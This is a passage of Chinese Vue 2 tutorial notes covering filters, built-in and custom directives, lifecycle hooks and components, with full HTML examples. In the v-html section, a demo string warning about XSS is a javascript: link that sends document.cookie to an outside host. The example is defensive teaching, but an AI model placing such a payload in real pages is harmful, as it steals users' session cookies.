    <script src="../js/vue.js"></script>
    <script src="../js/dayjs.min.js"></script>
</head>


<body>
        <!--
            过滤器：
                定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
                语法：
                        1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
                        2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
                备注：
                        1.过滤器也可以接收额外参数、多个过滤器也可以串联
                        2.并没有改变原本的数据, 是产生新的对应的数据
        -->
    <div id="root">
       <h2>显示格式化后的时间</h2>
       <!-- 计算属性实现 -->
       <h3>现在是: {{fmtTime}}</h3>
       <!-- methods实现 -->
       <h3>现在是: {{getFmtTime()}}</h3>
       <!-- 过滤器实现 -->
       <!-- |是管道符 -->
       <h3>现在是: {{time | timeFormater}}</h3>
       <!-- 过滤器传参 -->
       <h3>现在是: {{time | timeFormater('YYYY_MM_DD')}}</h3>
       <!-- 多个过滤器的串联 -->
       <h3>现在是: {{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
       <!-- 属性中也可以使用管道符过滤 -->
       <h3 :x="msg | mySlice">尚硅谷</h3></h3>
       <!-- 注意 , 过滤器只能使用在插值语法中和v-bind中 -->
       <!-- 不能使用在v-model中 -->
       <!-- <input type="text" v-model="msg | mySilce"> -->
    </div>
    <div id="root2">
        <h2>{{name | mySlice}}</h2>
    </div>
    <script>
        Vue.config.productionTip = false
        // 全局过滤器
        Vue.filter('mySlice', function(value) {
            return value.slice(0, 4);
        })


        const vm = new Vue({
            el: '#root',
            data: {
                // time: 1621561377603 // 时间戳
                time: Date.now(), // 时间戳
                msg: '你好,尚硅谷'
            },
            methods: {
                getFmtTime() {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
                }
            },
            computed: {
                fmtTime() {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
                }
            },
            // 局部过滤器
            filters: {
                timeFormater(value, str='YYYY-MM-DD HH:mm:ss') {
                    return dayjs(value).format(str);
                },
                // mySlice(value) {
                //     return value.slice(0, 4);
                // }
            }
        })


        new Vue({
            el: '#root2',
            data: {
                name: 'hello, atguigu'
            },
            methods: {
               
            }
        })
    </script>
</body>


</html>
```

## 内置指令

v-text

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>v-text指令</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
                我们学过的指令：
                        v-bind  : 单向绑定解析表达式, 可简写为 :xxx
                        v-model : 双向数据绑定
                        v-for   : 遍历数组/对象/字符串
                        v-on    : 绑定事件监听, 可简写为@
                        v-if        : 条件渲染（动态控制节点是否存存在）
                        v-else  : 条件渲染（动态控制节点是否存存在）
                        v-show  : 条件渲染 (动态控制节点是否展示)
                v-text指令：
                        1.作用：向其所在的节点中渲染文本内容。
                        2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
    -->
       
    <div id="root">
             
      <div>你好, {{name}}</div>
             
      <div v-text="name"></div>
             
      <div v-text="str"></div>
         
    </div>
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
          str: "<h2>你好啊!</h2>",
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

v-html
v-html 有安全性问题！！！！
(1).在网站上动态渲染任意 HTML 是非常危险的，容易导致 XSS 攻击。
(2).一定要在可信的内容上使用 v-html，永不要用在用户提交的内容上！

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>v-html指令</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
                v-html指令：
                        1.作用：向指定节点中渲染包含html结构的内容。
                        2.与插值语法的区别：
                                    (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                                    (2).v-html可以识别html结构。
                        3.严重注意：v-html有安全性问题！！！！
                                    (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                                    (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
        -->
       
    <div id="root">
             
      <div>你好, {{name}}</div>
             
      <div v-html="str"></div>
             
      <div v-html="str2"></div>
         
    </div>
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
          str: "<h2>你好啊!</h2>",
          str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我有好看的</a>',
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

![](https://cdn.xiamu.icu//Fnn1thQouxh4LjJCjoS1TfO4UvbU.png)
![](https://cdn.xiamu.icu//FmmCs9tkdddxo1kVJuhcN99iatz0.png)
v-cloak

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>v-cloak指令</title>
       
    <style>
              [v-cloak] {
                  display: none;
              }
         
    </style>
  </head>

  <body>
           
    <!-- 
                v-html指令：
                        1.作用：向指定节点中渲染包含html结构的内容。
                        2.与插值语法的区别：
                                    (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                                    (2).v-html可以识别html结构。
                        3.严重注意：v-html有安全性问题！！！！
                                    (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                                    (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
        -->
       
    <div id="root">
             
      <h2 v-cloak>{{name}}</h2>
         
    </div>
       
    <!-- 引入在线的vue.js然后F12Network设置网速为慢 -->
       
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root",
        data: {
          name: "尚硅谷",
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

v-once

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-once指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
        <!--
            v-once指令：
                        1.v-once所在节点在初次动态渲染后，就视为静态内容了。
                        2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
        -->
    <div id="root">
        <h2 v-once>初始的时候n = {{n}}</h2>
        <h2>当前的n = {{n}}</h2></h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
               
            }
        })
    </script>
</body>
</html>
```

v-pre

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-pre_指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
        <!--
            v-pre指令：
                    1.跳过其所在节点的编译过程。
                    2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
        -->
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>
        <h2>当前的n = {{n}}</h2></h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
               
            }
        })
    </script>
</body>
</html>
```

## 自定义指令

自定义指令

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>自定义指令</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
                需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
                需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
                自定义指令总结：
                        一、定义语法：
                                    (1).局部指令：
                                                new Vue({                                                           new Vue({
                                                    directives:{指令名:配置对象}   或           directives{指令名:回调函数}
                                                })                                                                      })
                                    (2).全局指令：
                                                    Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)


                        二、配置对象中常用的3个回调：
                                    (1).bind：指令与元素成功绑定时调用。
                                    (2).inserted：指令所在元素被插入页面时调用。
                                    (3).update：指令所在模板结构被重新解析时调用。


                        三、备注：
                                    1.指令定义时不加v-，但使用时要加v-；
                                    2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
        -->
       
    <div id="root">
             
      <h2>{{name}}</h2>
             
      <h2>当前的n值是: <span v-text="n"></span></h2>
             
      <h2>放大10倍后的值是: <span v-big="n"></span></h2>
             
      <h2>放大10倍后的值是: <span v-big-number="n"></span></h2>
              <button @click="n++">点我n+1</button>        
      <hr />
              <input type="text" v-fbind:value="n" />    
    </div>

       
    <div id="root2">        <input type="text" v-fbind:value="x" />    </div>
       
    <script>
      Vue.config.productionTip = false; // 定义全局指令
      Vue.directive("fbind", {
        bind(element, binding) {
          // console.log('bind');
          element.value = binding.value;
        },
        inserted(element, binding) {
          // console.log('inserted');
          element.focus();
        },
        update(element, binding) {
          // console.log('update');
          element.value = binding.value;
          element.focus();
        },
      }); /* Vue.directive('big', function (element, binding) {
            console.log('big', this); // 注意此处的this是window
            element.innerText = binding.value * 10
            // console.log(element, binding);
            // console.log('big');
        }) */
      const vm = new Vue({
        el: "#root",
        data: {
          n: 1,
          name: "尚硅谷",
        },
        methods: {}, // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
        directives: {
          big(element, binding) {
            console.log("big", this); // 注意此处的this是window
            element.innerText = binding.value * 10; // console.log(element, binding); // console.log('big');
          },
          "big-number"(element, binding) {
            element.innerText = binding.value * 10; // console.log(element, binding); // console.log('big');
          }, // fbind(element, binding) { //     element.value = binding.value //     element.focus() // } // fbind: { //     bind(element, binding) { //         // console.log('bind'); //         element.value = binding.value //     }, //     inserted(element, binding) { //         // console.log('inserted'); //         element.focus() //     }, //     update(element, binding) { //         // console.log('update'); //         element.value = binding.value //         element.focus() //     } // }
        },
      });

      new Vue({
        el: "#root2",
        data: {
          x: 1,
        },
        methods: {},
      });
    </script>
  </body>
</html>
```

回顾一个 DOM 操作

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>回顾一个DOM操作</title>
       
    <style>
              .demo {
                  background-color: orange;
              }
         
    </style>
  </head>
  <body>
        <button id="btn">点我创建一个输入框</button>    
    <script>
      const btn = document.getElementById("btn");
      btn.onclick = () => {
        const input = document.createElement("input");

        input.className = "demo";
        input.value = 99;
        input.onclick = () => {
          alert(1);
        };
        document.body.appendChild(input);

        input.focus();

        input.parentElement.style.backgroundColor = "skyblue";
        console.log(input.parentElement);
      };
    </script>
  </body>
</html>
```

## 引出生命周期

![](https://cdn.xiamu.icu//FqcrWcHYCjgxqE6EDzzj7L3577L9.png)
引出生命周期

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>引出生命周期</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
                生命周期：
                        1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
                        2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
                        3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
                        4.生命周期函数中的this指向是vm 或 组件实例对象。
    -->
       
    <div id="root">
             
      <h2 :style="{opacity: opacity}">欢迎学习Vue</h2>
         
    </div>
       
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          opacity: 1,
        },
        methods: {}, // Vue完成模板的解析并把初始的真实的DOM元素放入页面后 (挂载完毕) 调用mounted
        mounted() {
          setInterval(() => {
            this.opacity -= 0.01;
            if (this.opacity <= 0) {
              this.opacity = 1;
            }
          }, 16);
        },
      }); /* setInterval(() => { // 通过外部的定时器实现(不推荐)
            vm.opacity -= 0.01
            if (vm.opacity <= 0) {
                vm.opacity = 1
            }
        }, 16); */
    </script>
  </body>
</html>
```

分析生命周期

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>分析生命周期</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root" :x="n">
             
      <h2>当前的n值是: {{n}}</h2>
              <button @click="add">点我n+1</button>        
      <button @click="bye">点我销毁</button>    
    </div>
       
    <script>
      Vue.config.productionTip = false;
      new Vue({
        el: "#root", // 使用了template配置项, 就不能有两个根节点 // template: '<h2>当前的n值是: {{n}}</h2><button @click="add">点我n+1</button>', // 应该只能有一个根节点 // template: '<div><h2>当前的n值是: {{n}}</h2><button @click="add">点我n+1</button></div>', // ES6语法, 可以换行, 上面的写法不能换行 // 用了template模板之后, div#root中的x属性会被template模板覆盖掉 // 没有使用template模板, div#root中的x属性不会被替换掉 // template: ` // <div> //     <h2>当前的n值是: {{n}}</h2> //     <button @click="add">点我n+1</button> // </div>`,
        data: {
          n: 1,
        },
        methods: {
          add() {
            console.log("add");
            this.n++;
          },
          bye() {
            // https://v2.cn.vuejs.org/v2/api/#vm-destroy
            // vm.$destroy()
            // 完全销毁一个实例。清理它与其它实例的连接，解绑它的全部指令及事件监听器。
            // https://www.bilibili.com/video/BV1Zy4y1K7SH?t=590.0
            // 在v2.7版本以后会释放掉事件监听器
            // 在v2.6.12版本不会释放掉事件监听器
            // 视频中(v2.6.12版本)描述只会释放掉自定义事件监听器, 但是现在如果引入的vue版本是2.7的, 都会被释放掉

            console.log("bye");
            this.$destroy();
          },
        },
        watch: {
          n() {
            console.log("n变了");
          },
        }, // 此时无法通过vm访问到data中的数据, methods中的方法
        beforeCreate() {
          console.log("beforeCreate"); // console.log(this); // debugger
        }, // 此时, 可以通过vm访问到data中的数据, methods中配置的方法
        created() {
          console.log("created"); // console.log(this); // debugger
        }, // 未执行beforeMount()之前 // 此阶段Vue开始解析模板, 生成虚拟DOM(内存中), 页面还不能显示解析好的内容 // 执行beforeMount() // 此时页面呈现的是未经Vue编译的DOM结构 // 所有对DOM的操作, 最终都不奏效
        beforeMount() {
          console.log("beforeMount"); // console.log(this); // document.querySelector('h2').innerText = '哈哈' // debugger
        }, // 此时: // 1.页面中呈现的是经过Vue编译的DOM // 2.对DOM的操作均有效(尽可能避免) // 至此初始化过程结束, 一般在此进行: 开启定时器, // 发送网络请求, 订阅消息, 绑定自定义事件等初始化操作
        mounted() {
          console.log("mounted"); // console.log(this); // document.querySelector('h2').innerText = '哈哈' // debugger
        }, // 此时数据是新的, 但页面是旧的 // 即: 页面尚未和数据保持同步
        beforeUpdate() {
          console.log("beforeUpdate"); // console.log(this.n); // debugger;
        }, // Virtual DOM re-render and patch // 根据新数据, 生成新的虚拟DOM, 随后与旧的虚拟DOM进行比较 // 最终完成页面更新, 即: 完成了Model => View的更新 // 此时: 数据是新的, 页面也是新的 // 即: 页面和数据保持同步

        updated() {
          console.log("updated"); // console.log(this.n); // debugger
        },
        beforeDestroy() {
          console.log("beforeDestroy");
          this.add();
        },
        destroyed() {
          console.log("destroyed");
        },
      });
    </script>
  </body>
</html>
```

总结生命周期

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>总结生命周期</title>
    <script src="../js/vue.js"></script>
  </head>

  <body>
    <!-- 
				常用的生命周期钩子：
						1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
						2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

				关于销毁Vue实例
						1.销毁后借助Vue开发者工具看不到任何信息。
						2.销毁后自定义事件会失效，但原生DOM事件依然有效。
						3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
		-->
    <div id="root">
      <h2 :style="{opacity: opacity}">欢迎学习Vue</h2>
      <button @click="stop">点我停止变化</button>
    </div>
    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: "#root",
        data: {
          opacity: 1,
        },
        methods: {
          stop() {
            this.$destroy();
          },
        },
        mounted() {
          this.timer = setInterval(() => {
            console.log("setInterval");
            this.opacity -= 0.01;
            if (this.opacity <= 0) {
              this.opacity = 1;
            }
          }, 16);
        },
        beforeDestroy() {
          console.log("vm即将驾鹤西游了");
          clearInterval(this.timer);
        },
      });
    </script>
  </body>
</html>
```

## 组件的概念

![](https://cdn.xiamu.icu//FsJ5Ehmvfaq_wRtLQZ1gnVtd3EFR.png)
![](https://cdn.xiamu.icu//FsJXBkJIYwUrkIeKShGaDuYDv5Q1.png)
![](https://cdn.xiamu.icu//Fl4wBDArL6HVIiXaPcVsLM8qSPuN.png)
组件的定义: 实现应用中局部功能代码和资源的集合

## 非单文件组件

> 组件就是一块砖, 哪里需要哪里搬

非单文件组件:
一个文件中包含有 n 个组件
单文件组件的嵌套组件:
一个文件中只包含有 1 个组件
基本使用

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>基本使用</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
            Vue中使用组件的三大步骤：
                    一、定义组件(创建组件)
                    二、注册组件
                    三、使用组件(写组件标签)


            一、如何定义一个组件？
                        使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
                        区别如下：
                                1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                                2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
                        备注：使用template可以配置组件结构。


            二、如何注册组件？
                            1.局部注册：靠new Vue的时候传入components选项
                            2.全局注册：靠Vue.component('组件名',组件)


            三、编写组件标签：
                            <school></school>
        -->
       
    <div id="root">
              <hello></hello>        
      <hr />
             
      <h1>{{msg}}</h1>
             
      <hr />
             
      <!-- 第三步：编写组件标签 -->
              <student></student>        
      <hr />
             
      <!-- 第三步：编写组件标签 -->
              <school></school>    
    </div>
       
    <div id="root2">        <hello></hello>    </div>
       
    <script>
      Vue.config.productionTip = false; // 第一步：创建student组件

      const student = Vue.extend({
        // el: '#root',
        template: `
            <div>
                <h2>学生姓名: {{studentName}}</h2>
                <h2>学生年龄: {{age}}</h2>
            </div>
            `,
        data() {
          return {
            studentName: "张三",
            age: 18,
          };
        },
      }); // 第一步：创建school组件

      const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称: {{schoolName}}</h2>
                <h2>学校地址: {{address}}</h2>
                <button @click="showName">点我提示学校名</button>
            </div>
            `, // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。

        data() {
          return {
            schoolName: "尚硅谷",
            address: "北京昌平",
          };
        },
        methods: {
          showName() {
            alert(this.schoolName);
          },
        },
      }); //第一步：创建hello组件

      const hello = Vue.extend({
        template: `
            <div>
                <h2>你好啊! {{name}}</h2>
            </div>
            `,
        data() {
          return {
            name: "Tom",
          };
        },
      }); //第二步：全局注册组件

      Vue.component("hello", hello); //创建vm
      new Vue({
        el: "#root",
        data: {
          msg: "你好啊！",
        },
        methods: {}, //第二步：注册组件（局部注册）
        components: {
          school,
          student,
        },
      });

      new Vue({
        el: "#root2",
      });
    </script>
  </body>
</html>
```

几个注意点

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>几个注意点</title>
       
    <script src="../js/vue.js"></script>
  </head>
  <body>
           
    <!-- 
            几个注意点：
                    1.关于组件名:
                                一个单词组成：
                                            第一种写法(首字母小写)：school
                                            第二种写法(首字母大写)：School
                                多个单词组成：
                                            第一种写法(kebab-case命名)：my-school
                                            第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
                                备注：
                                        (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
                                        (2).可以使用name配置项指定组件在开发者工具中呈现的名字。


                    2.关于组件标签:
                                第一种写法：<school></school>
                                第二种写法：<school/>
                                备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。


                    3.一个简写方式：
                                const school = Vue.extend(options) 可简写为：const school = options
        -->
       
    <!-- 准备好一个容器 -->
       
    <div id="root">
             
      <h1>{{msg}}</h1>
              <school></school>    
    </div>
       
    <script>
      Vue.config.productionTip = false; // 定义组件
      const s = Vue.extend({
        template: `
            <div>
                <h2>学校名称: {{name}}</h2>
                <h2>学校地址: {{address}}</h2>
            </div>
            `,
        data() {
          return {
            name: "尚硅谷",
            address: "北京",
          };
        },
      });
      new Vue({
        el: "#root",
        data: {
          msg: "欢迎学习Vue!",
        },
        methods: {},
        components: {
          school: s,
        },
      });
    </script>
  </body>
</html>
```

组件的嵌套

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>组件的嵌套</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <div id="root">   </div>
       
    <script>
      Vue.config.productionTip = false; //定义student组件

      const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名: {{name}}</h2>
                <h2>学生年龄: {{age}}</h2>
            </div>
            `,
        name: "student",
        data() {
          return {
            name: "肉豆蔻",
            age: 18,
          };
        },
      }); //定义school组件

      const school = Vue.extend({
        template: `
                <div>
                    <h2>学校名称: {{name}}</h2>
                    <h2>学校地址: {{address}}</h2>
                    <student></student>
                </div>
            `,
        name: "school",
        data() {
          return {
            name: "尚硅谷",
            address: "北京",
          };
        }, //注册组件（局部）
        components: {
          student: student,
        },
      }); //定义hello组件
      const hello = Vue.extend({
        template: `
            <h1>{{msg}}</h1>
            `,
        data() {
          return {
            msg: "欢迎来到尚硅谷学习！",
          };
        },
      }); //定义app组件
      const app = Vue.extend({
        template: `
            <div>
                <hello></hello>
                <school></school>
            </div>
            `,
        components: {
          school,
          hello,
        },
      }); //创建vm

      new Vue({
        template: `
                <app></app>
            `,
        el: "#root",
        data: {},
        methods: {}, //注册组件（局部）
        components: {
          app,
        },
      });
    </script>
  </body>
</html>
```

VueComponent

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>VueComponent</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
       
    <!-- 
            关于VueComponent：
                        1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。


                        2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
                            即Vue帮我们执行的：new VueComponent(options)。


                        3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！


                        4.关于this指向：
                                (1).组件配置中：
                                            data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
                                (2).new Vue(options)配置中：
                                            data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。


                        5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
                            Vue的实例对象，以后简称vm。
        -->
       
    <div id="root">        <school></school>         <hello></hello>    </div>
       
    <script>
      Vue.config.productionTip = false; //定义school组件
      const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">点我提示学校名</button>
            </div>
            `,
        data() {
          return {
            name: "尚硅谷",
            address: "北京",
          };
        },
        methods: {
          showName() {
            console.log("showName", this); // alert(this.name)
          },
        },
      });

      const test = Vue.extend({
        template: `<span>atguigu</span>`,
      }); //定义hello组件

      const hello = Vue.extend({
        template: `
                <div>
                    <h2>{{msg}}</h2>
                    <test></test>
                </div>
            `,
        data() {
          return {
            msg: "你好啊!",
          };
        },
        components: {
          test,
        },
      }); // 证明是两个VueComponent, 而不是用的一个VueComponent // console.log('@', school === hello); // school.a = 99 // console.log('@', school.a); // console.log('@', hello.a); // 每次调用的VueComponent都是现定义的, 然后再返回的 // Vue.extend = function (extendOptions) { //      ... //     var Sub = function VueComponent(options) { //         this._init(options); //     }; //      ... //     return Sub // }; // console.log('@', school); // console.log('#', hello); // 创建vm

      new Vue({
        el: "#root",
        data: {},
        methods: {},
        components: {
          school,
          hello,
        },
      });
    </script>
  </body>
</html>
```

一个重要的内置关系

```html
<!DOCTYPE html>
<html lang="en">
  <head>
       
    <meta charset="UTF-8" />
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
       
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
       
    <title>一个重要的内置关系</title>
       
    <script src="../js/vue.js"></script>
  </head>

  <body>
           
    <!-- 
                1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
                2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
        -->
       
    <div id="root">        <school></school>    </div>
       
    <script>
      Vue.config.productionTip = false;
      Vue.prototype.x = 99; //定义school组件

      const school = Vue.extend({
        template: `
                <div>
                    <h2>学校名称: {{name}}</h2>
                    <h2>学校地址: {{address}}</h2>
                    <button @click="showX">点我输出x</button>
                </div>
            `,
        name: "school",
        data() {
          return {
            name: "尚硅谷",
            address: "北京",
          };
        },
        methods: {
          showX() {
            console.log(this.x);
          },
        },
      }); // 创建一个vm

      const vm = new Vue({
        el: "#root",
        data: {
          msg: "你好",
        },
        methods: {},
        components: {
          school,
        },
      });

      console.log(
        school.prototype.__proto__ === Vue.prototype
      ); /* // 定义一个构造函数
        function Demo() {
            this.a = 1
            this.b = 2
        }
        // 创建一个Demo的实例对象
        const d = new Demo()


        // 显示原型属性
        console.log(Demo.prototype);
        // 隐式原型属性
        console.log(d.__proto__);


        console.log(Demo.prototype === d.__proto__);


        // 程序员通过显示原型属性操作原型对象, 追加一个x属性, 值为99
        Demo.prototype.x = 99


        console.log('@', d); */
    </script>
  </body>
</html>
```

实例的隐式原型对象永运指向缔造者的原型对象
![](https://cdn.xiamu.icu//FsKi0imheF9Ehf-wGac3AO7M-UeF.png)

##
